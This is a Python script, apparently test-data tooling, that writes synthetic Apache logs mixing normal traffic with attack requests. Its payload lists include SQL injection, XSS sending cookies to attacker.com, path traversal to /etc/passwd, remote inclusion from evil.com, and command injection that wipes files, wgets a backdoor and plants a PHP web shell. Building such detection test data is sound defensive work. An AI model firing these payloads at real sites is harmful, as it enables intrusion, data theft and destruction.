import os
import random
from datetime import datetime, timedelta

def generate_apache_log(ip, user_agent, status, method, url, time):
    """Génère une entrée de log Apache."""
    size = random.randint(100, 10000)
    return f'{ip} - - [{time}] "{method} {url} HTTP/1.1" {status} {size} "{url}" "{user_agent}"'

def generate_sql_injection_attempts():
    """Génère des exemples d'injections SQL."""
    payloads = [
        "/login.php?username=admin';DROP%20TABLE%20users;--",
        "/search.php?q=1%20OR%201=1",
        "/profile.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
        "/products.php?category=1';%20UPDATE%20users%20SET%20admin=1%20WHERE%20username='admin'--",
        "/cart.php?id=1%20OR%20id%20IS%20NOT%20NULL;%20--",
    ]
    return payloads

def generate_xss_attacks():
    """Génère des exemples d'attaques XSS."""
    payloads = [
        "/comment.php?text=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "/post.php?title=<img%20src='x'%20onerror='alert(document.cookie)'>",
        "/profile.php?name=<svg%20onload=alert(1)>",
        "/search.php?q=<iframe%20src='javascript:alert(\"XSS\")'></iframe>",
        "/feedback.php?message=<div%20onmouseover='alert(document.cookie)'%20style='width:100%;height:100%'>Hover%20me</div>"
    ]
    return payloads

def generate_auth_failures():
    """Génère des exemples d'échecs d'authentification."""
    usernames = ["admin", "root", "administrator", "user", "guest"]
    ips = [f"192.168.1.{random.randint(1, 255)}" for _ in range(5)]
    urls = ["/login", "/admin/login", "/wp-login.php", "/portal/login", "/auth"]
    
    logs = []
    for ip in ips:
        for username in random.sample(usernames, 3):
            for url in random.sample(urls, 2):
                logs.append((ip, f"{url}?username={username}&password=******", "POST", "401"))
    
    return logs

def generate_normal_traffic():
    """Génère des exemples de trafic normal."""
    pages = ["/", "/index.html", "/about", "/products", "/contact", "/blog", "/faq", 
             "/services", "/news", "/gallery", "/downloads", "/register", "/profile"]
    
    methods = ["GET"] * 9 + ["POST"] * 1  # 90% GET, 10% POST
    statuses = ["200"] * 95 + ["304"] * 3 + ["404"] * 2  # 95% 200, 3% 304, 2% 404
    
    logs = []
    for _ in range(50):
        url = random.choice(pages)
        method = random.choice(methods)
        status = random.choice(statuses)
        logs.append((None, url, method, status))
    
    return logs

def generate_file_inclusion_attempts():
    """Génère des exemples de tentatives d'inclusion de fichiers."""
    payloads = [
        "/page.php?file=../../../../etc/passwd",
        "/index.php?include=../../../config.php",
        "/view.php?template=../../../../../../../proc/self/environ",
        "/display.php?module=http://evil.com/malicious_script.php",
        "/load.php?file=../../../../../../../windows/win.ini"
    ]
    return payloads

def generate_command_injection_attempts():
    """Génère des exemples de tentatives d'injection de commandes."""
    payloads = [
        "/ping.php?host=localhost;%20rm%20-rf%20/",
        "/tools.php?cmd=127.0.0.1%20|%20cat%20/etc/passwd",
        "/exec.php?command=ls%20-la;%20id",
        "/system.php?exec=wget%20http://malicious.com/backdoor.php",
        "/run.php?program=echo%20'<?php%20system($_GET[cmd]);%20?>'%20>%20shell.php"
    ]
    return payloads

def generate_logs(output_file, num_days=3, normal_ratio=0.8):
    """Génère un fichier de logs avec un mélange de trafic normal et d'attaques."""
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    
    attacker_agents = [
        "sqlmap/1.5.12#stable (http://sqlmap.org)",
        "Wget/1.20.3 (linux-gnu)",
        "Nikto/2.1.6",
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "curl/7.68.0"
    ]
    
    normal_ips = [f"192.168.1.{random.randint(1, 255)}" for _ in range(20)]
    attacker_ips = [f"10.0.{random.randint(1, 255)}.{random.randint(1, 255)}" for _ in range(5)]
    
    # Préparer les attaques
    sql_payloads = generate_sql_injection_attempts()
    xss_payloads = generate_xss_attacks()
    auth_failures = generate_auth_failures()
    file_inclusion = generate_file_inclusion_attempts()
    cmd_injection = generate_command_injection_attempts()
    
    # Générer les dates pour la période spécifiée
    end_date = datetime.now()
    start_date = end_date - timedelta(days=num_days)
    
    # Calculer les intervalles de temps
    time_range = (end_date - start_date).total_seconds()
    
    with open(output_file, 'w') as f:
        # Générer du trafic normal
        normal_logs = []
        for _ in range(int(1000 * normal_ratio)):
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(normal_ips)
            agent = random.choice(user_agents)
            url, method, status = random.choice(generate_normal_traffic())[1:]
            log = generate_apache_log(ip, agent, status, method, url, time_str)
            normal_logs.append((random_time, log))
        
        # Générer des attaques SQL injection
        sql_logs = []
        for payload in sql_payloads:
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(attacker_ips)
            agent = random.choice(attacker_agents + user_agents)
            log = generate_apache_log(ip, agent, "200", "GET", payload, time_str)
            sql_logs.append((random_time, log))
        
        # Générer des attaques XSS
        xss_logs = []
        for payload in xss_payloads:
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(attacker_ips)
            agent = random.choice(attacker_agents + user_agents)
            log = generate_apache_log(ip, agent, "200", "GET", payload, time_str)
            xss_logs.append((random_time, log))
        
        # Générer des échecs d'authentification
        auth_logs = []
        for ip, url, method, status in auth_failures:
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            agent = random.choice(user_agents)
            log = generate_apache_log(ip, agent, status, method, url, time_str)
            auth_logs.append((random_time, log))
        
        # Générer des tentatives d'inclusion de fichiers
        file_logs = []
        for payload in file_inclusion:
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(attacker_ips)
            agent = random.choice(attacker_agents)
            log = generate_apache_log(ip, agent, "404", "GET", payload, time_str)
            file_logs.append((random_time, log))
        
        # Générer des tentatives d'injection de commandes
        cmd_logs = []
        for payload in cmd_injection:
            random_time = start_date + timedelta(seconds=random.randint(0, int(time_range)))
            time_str = random_time.strftime("%d/%b/%Y:%H:%M:%S +0000")
            ip = random.choice(attacker_ips)
            agent = random.choice(attacker_agents)
            log = generate_apache_log(ip, agent, "500", "GET", payload, time_str)
            cmd_logs.append((random_time, log))
        
        # Combiner et trier les logs par date
        all_logs = normal_logs + sql_logs + xss_logs + auth_logs + file_logs + cmd_logs
        all_logs.sort()
        
        # Écrire dans le fichier
        for _, log in all_logs:
            f.write(log + "\n")
            
    print(f"Fichier de logs généré avec succès: {output_file}")
    print(f"Total des entrées: {len(all_logs)}")
    print(f"- Trafic normal: {len(normal_logs)}")
    print(f"- Injections SQL: {len(sql_logs)}")
    print(f"- Attaques XSS: {len(xss_logs)}")
    print(f"- Échecs d'authentification: {len(auth_logs)}")
    print(f"- Inclusions de fichiers: {len(file_logs)}")
    print(f"- Injections de commandes: {len(cmd_logs)}")

if __name__ == "__main__":
    output_dir = "data/raw_logs"
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "test_logs.log")
    generate_logs(output_file)